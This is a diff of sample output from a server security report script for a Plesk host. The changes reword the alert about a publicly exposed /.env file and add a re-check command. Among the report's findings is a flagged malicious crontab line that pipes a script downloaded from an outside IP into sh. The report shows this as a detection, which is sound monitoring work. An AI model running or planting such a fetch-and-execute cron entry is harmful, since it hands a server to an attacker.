@@ -114,11 +114,11 @@ STATUS: WARNING (13)
  ! Mail: mailbox info@shop.example logged in via IMAP/POP3 from a new country outside DE AT CH: 192.0.2.15 (BR, Example Cloud Ltd [datacenter], 48.3 MB of mail read) – travelling, or password compromised?
  ! fail2ban: jail plesk-courierimap bans 198.51.100.77 (DE, Example Kabel GmbH), which had successful logins before (mail logins of office@lawfirm.example (last 2026-10-25)) – a device with an outdated password? Unban: fail2ban-client set plesk-courierimap unbanip 198.51.100.77
  ! Web: blog.example logged 48 PHP fatal errors
- ! Web: shop.example served the sensitive file /.env (HTTP 200, file exists) – remove it or block access; assume it was downloaded
+ ! Web: shop.example served the sensitive file /.env (HTTP 200, file exists) – a request in the access log since the last run; remove the file or block access, and assume it was downloaded
  ! Web: 2 new PHP file(s) in wp-content/uploads – possible malware
  ! Cron: new entry with suspicious content in crontab of shop_web: */10 * * * * curl -fsSL http://203.0.113.66/u.sh | sh – check it
  ! Updates: 3 security update(s) pending
- ! Web: shop.example exposes /.env publicly (HTTP 200) – remove it from the document root or block access
+ ! Web: shop.example exposes /.env publicly (HTTP 200) – remove it from the document root or block access, then check again: plesk-server-report.sh --only exposed
 
 == MAIL ==
 Source: /var/log/maillog, 5212 new lines
@@ -306,6 +306,7 @@ Exposed files in document roots (.env, .git, dumps, backups, config copies, info
   shop.example/.env – PUBLICLY REACHABLE (HTTP 200)
   shop.example: 1 file(s) found but blocked by the web server (HTTP 403), e.g. /.git/
   42 document root(s) scanned, 2 finding(s); only publicly reachable ones raise an alert
+  This list is from the daily check (see "As of") and repeats until the next one. After fixing a file, check again right away: plesk-server-report.sh --only exposed – or rm /var/lib/plesk-server-report/daily_date to refresh the daily checks in the next run
 
 Suspicious code in recently changed PHP files (typical webshell/backdoor patterns):
   42 document root(s) scanned, 0 suspicious file(s)
@@ -340,7 +341,7 @@ Built from the reports of this period. Daily checks and fail2ban: see latest.txt
 
 == ALERTS (times seen, first – last, text) ==
    10×  2026-10-26 01:05 UTC – 2026-10-26 10:05 UTC  Updates: 3 security update(s) pending
-   10×  2026-10-26 01:05 UTC – 2026-10-26 10:05 UTC  Web: shop.example exposes /.env publicly (HTTP 200) – remove it from the document root or block access
+   10×  2026-10-26 01:05 UTC – 2026-10-26 10:05 UTC  Web: shop.example exposes /.env publicly (HTTP 200) – remove it from the document root or block access, then check again: plesk-server-report.sh --only exposed
     6×  2026-10-26 05:05 UTC – 2026-10-26 10:05 UTC  fail2ban: jail plesk-courierimap bans 198.51.100.77 (DE, Example Kabel GmbH), which had successful logins before (mail logins of office@lawfirm.example (last 2026-10-25)) – a device with an outdated password? Unban: fail2ban-client set plesk-courierimap unbanip 198.51.100.77
     1×  2026-10-26 09:05 UTC – 2026-10-26 09:05 UTC  Mail: mailbox info@shop.example used from 5 different IPs – password compromised?
     1×  2026-10-26 09:05 UTC – 2026-10-26 09:05 UTC  Mail: mailbox info@shop.example sent 23 mails with a foreign sender domain – spam?
